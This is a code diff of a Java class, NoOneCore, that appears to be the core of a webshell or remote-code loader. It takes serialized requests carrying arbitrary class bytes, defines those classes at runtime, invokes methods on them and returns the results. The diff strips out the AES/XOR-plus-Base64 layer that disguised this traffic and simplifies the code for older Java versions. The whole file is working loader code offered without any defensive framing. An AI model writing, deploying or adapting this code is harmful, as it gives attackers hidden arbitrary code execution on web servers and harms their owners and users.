@@ -1,12 +1,8 @@
-package com.reajason.noone.server;
+package com.reajason.noone.core;
 
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.nio.charset.StandardCharsets;
-import java.security.MessageDigest;
 import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
 
@@ -39,44 +35,20 @@ public class NoOneCore extends ClassLoader {
     private static final int FAILURE = 1;
 
     // plugin to clazz
-    public static Map<String, Class<?>> loadedPluginCache = new ConcurrentHashMap<>();
+    public static Map<String, Class<?>> loadedPluginCache = new ConcurrentHashMap<String, Class<?>>();
 
-    // 加密配置（格式: "aesKey|xorKey"）
-    private static String key = "";
-    private static byte[] aesKey = null;
-    private static byte[] xorKey = null;
+    private static NoOneCore classDefiner = new NoOneCore(Thread.currentThread().getContextClassLoader());
 
+    private Object parentObj;
     private OutputStream outputStream;
     private Writer writer;
     private byte[] inputBytes;
-    private static NoOneCore classDefiner = new NoOneCore(Thread.currentThread().getContextClassLoader());
-
-    // 静态初始化密钥
-    static {
-        initKeys(key);
-    }
-
-    /**
-     * 初始化加密密钥
-     * @param keyString 格式: "aesKey|xorKey" 或空字符串（不加密）
-     */
-    private static void initKeys(String keyString) {
-        if (keyString == null || keyString.isEmpty()) {
-            aesKey = null;
-            xorKey = null;
-            return;
-        }
-
-        String[] keys = keyString.split("\\|");
-        if (keys.length >= 1 && !keys[0].isEmpty()) {
-            aesKey = md5(keys[0]);
-        }
-        if (keys.length >= 2 && !keys[1].isEmpty()) {
-            xorKey = keys[1].getBytes(StandardCharsets.UTF_8);
-        }
-    }
 
     public NoOneCore() {
+    }
+
+    public NoOneCore(Object parentObj) {
+        this.parentObj = parentObj;
     }
 
     public NoOneCore(ClassLoader parent) {
@@ -110,16 +82,11 @@ public class NoOneCore extends ClassLoader {
 
     @Override
     public String toString() {
-        Map<String, Object> result = new LinkedHashMap<>();
+        Map<String, Object> result = new LinkedHashMap<String, Object>();
         result.put(CODE, SUCCESS);
-        Map<String, Object> args = new HashMap<>();
+        Map<String, Object> args = new HashMap<String, Object>();
         try {
-            // 解密输入数据
-            byte[] decryptedInput = decryptInput(inputBytes);
-            // Base64 解码
-            byte[] decodedData = Base64.getDecoder().decode(decryptedInput);
-            // 反序列化
-            args = deserialize(decodedData);
+            args = deserialize(inputBytes);
         } catch (Throwable e) {
             result.put(CODE, FAILURE);
             result.put(ERROR, getStackTraceAsString(new RuntimeException("args parsed failed, " + e.getMessage(), e)));
@@ -127,20 +94,16 @@ public class NoOneCore extends ClassLoader {
         String action = (String) args.get(ACTION);
         if (action != null) {
             try {
-                switch (action) {
-                    case ACTION_STATUS:
-                        result.putAll(getStatus());
-                        break;
-                    case ACTION_RUN:
-                        result.putAll(run(args));
-                        break;
-                    case ACTION_CLEAN:
-                        loadedPluginCache.clear();
-                        classDefiner = null;
-                        break;
-                    default:
-                        result.put(CODE, FAILURE);
-                        result.put(ERROR, "action [" + action + "] not supported");
+                if (ACTION_STATUS.equals(action)) {
+                    result.putAll(getStatus());
+                } else if (ACTION_RUN.equals(action)) {
+                    result.putAll(run(args));
+                } else if (ACTION_CLEAN.equals(action)) {
+                    loadedPluginCache.clear();
+                    classDefiner = null;
+                } else {
+                    result.put(CODE, FAILURE);
+                    result.put(ERROR, "action [" + action + "] not supported");
                 }
             } catch (Throwable e) {
                 result.put(CODE, FAILURE);
@@ -155,9 +118,9 @@ public class NoOneCore extends ClassLoader {
     }
 
     public Map<String, Object> getStatus() {
-        Map<String, Object> result = new HashMap<>();
+        Map<String, Object> result = new HashMap<String, Object>();
         // plugin to className
-        Map<String, String> caches = new HashMap<>();
+        Map<String, String> caches = new HashMap<String, String>();
         for (Map.Entry<String, Class<?>> entry : loadedPluginCache.entrySet()) {
             Class<?> clazz = entry.getValue();
             String plugin = entry.getKey();
@@ -170,7 +133,7 @@ public class NoOneCore extends ClassLoader {
 
     @SuppressWarnings("unchecked")
     public Map<String, Object> run(Map<String, Object> args) {
-        Map<String, Object> result = new HashMap<>();
+        Map<String, Object> result = new HashMap<String, Object>();
         String plugin = (String) args.get(PLUGIN);
         String className = (String) args.get(CLASSNAME);
         byte[] classBytes = (byte[]) args.get(CLASS_BYTES);
@@ -203,7 +166,7 @@ public class NoOneCore extends ClassLoader {
             if (methodName != null) {
                 Map<String, Object> methodArgs = (Map<String, Object>) args.get(ARGS);
                 if (methodArgs == null) {
-                    methodArgs = new HashMap<>();
+                    methodArgs = new HashMap<String, Object>();
                 }
                 methodArgs.put(PLUGIN_CACHES, loadedPluginCache);
                 result.put(DATA, clazz.getMethod(methodName, Map.class).invoke(null, methodArgs));
@@ -216,19 +179,13 @@ public class NoOneCore extends ClassLoader {
     }
 
     public void writeResult(Map<String, Object> result) throws IOException {
-        // 序列化
-        byte[] serializedData = serialize(result);
-        // Base64 编码
-        byte[] base64Data = Base64.getEncoder().encodeToString(serializedData).getBytes(StandardCharsets.UTF_8);
-        // 加密输出数据
-        byte[] encryptedData = encryptOutput(base64Data);
-
+        byte[] bytes = serialize(result);
         if (outputStream != null) {
-            outputStream.write(encryptedData, 0, encryptedData.length);
+            outputStream.write(bytes, 0, bytes.length);
             outputStream.flush();
             outputStream.close();
         } else if (writer != null) {
-            writer.write(new String(encryptedData, StandardCharsets.UTF_8));
+            writer.write(new String(bytes, "UTF-8"));
             writer.flush();
             writer.close();
         }
@@ -394,7 +351,7 @@ public class NoOneCore extends ClassLoader {
 
     private Map<String, Object> readMap(DataInputStream dis) throws IOException {
         int size = dis.readInt();
-        Map<String, Object> map = new HashMap<>(size);
+        Map<String, Object> map = new HashMap<String, Object>(size);
         for (int i = 0; i < size; i++) {
             String key = dis.readUTF();
             Object value = readObject(dis);
@@ -425,7 +382,7 @@ public class NoOneCore extends ClassLoader {
                 return bytes;
             case LIST:
                 int listSize = dis.readInt();
-                List<Object> list = new ArrayList<>(listSize);
+                List<Object> list = new ArrayList<Object>(listSize);
                 for (int i = 0; i < listSize; i++) {
                     list.add(readObject(dis));
                 }
@@ -449,110 +406,5 @@ public class NoOneCore extends ClassLoader {
         PrintWriter pw = new PrintWriter(sw);
         throwable.printStackTrace(pw);
         return sw.toString();
-    }
-
-    // ==================== 加解密方法 ====================
-
-    /**
-     * MD5 哈希（用于生成 AES 密钥）
-     */
-    private static byte[] md5(String input) {
-        try {
-            MessageDigest md = MessageDigest.getInstance("MD5");
-            return md.digest(input.getBytes(StandardCharsets.UTF_8));
-        } catch (Exception e) {
-            throw new RuntimeException("MD5 failed", e);
-        }
-    }
-
-    /**
-     * XOR 加密/解密
-     * @param data 数据
-     * @param key 密钥
-     * @return 加密/解密后的数据
-     */
-    private static byte[] xor(byte[] data, byte[] key) {
-        if (key == null || key.length == 0) {
-            return data;
-        }
-        byte[] result = new byte[data.length];
-        for (int i = 0; i < data.length; i++) {
-            result[i] = (byte) (data[i] ^ key[i % key.length]);
-        }
-        return result;
-    }
-
-    /**
-     * AES 加密
-     * @param data 明文
-     * @param key AES 密钥（16 字节）
-     * @return 密文
-     */
-    private static byte[] aesEncrypt(byte[] data, byte[] key) {
-        if (key == null) {
-            return data;
-        }
-        try {
-            SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
-            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
-            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
-            return cipher.doFinal(data);
-        } catch (Exception e) {
-            throw new RuntimeException("AES encrypt failed", e);
-        }
-    }
-
-    /**
-     * AES 解密
-     * @param data 密文
-     * @param key AES 密钥（16 字节）
-     * @return 明文
-     */
-    private static byte[] aesDecrypt(byte[] data, byte[] key) {
-        if (key == null) {
-            return data;
-        }
-        try {
-            SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
-            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
-            cipher.init(Cipher.DECRYPT_MODE, secretKey);
-            return cipher.doFinal(data);
-        } catch (Exception e) {
-            throw new RuntimeException("AES decrypt failed", e);
-        }
-    }
-
-    /**
-     * 解密输入数据（XOR -> AES）
-     * @param encryptedData 加密的数据
-     * @return 解密后的数据
-     */
-    private static byte[] decryptInput(byte[] encryptedData) {
-        if (aesKey == null && xorKey == null) {
-            return encryptedData;
-        }
-        byte[] data = encryptedData;
-        // 先 AES 解密
-        data = aesDecrypt(data, aesKey);
-        // 再 XOR 解密
-        data = xor(data, xorKey);
-        return data;
-    }
-
-    /**
-     * 加密输出数据（XOR -> AES）
-     * @param plainData 明文数据
-     * @return 加密后的数据
-     */
-    private static byte[] encryptOutput(byte[] plainData) {
-        if (aesKey == null && xorKey == null) {
-            return plainData;
-        }
-        byte[] data = plainData;
-        // 先 XOR 加密
-        data = xor(data, xorKey);
-        // 再 AES 加密
-        data = aesEncrypt(data, aesKey);
-        return data;
     }
 }
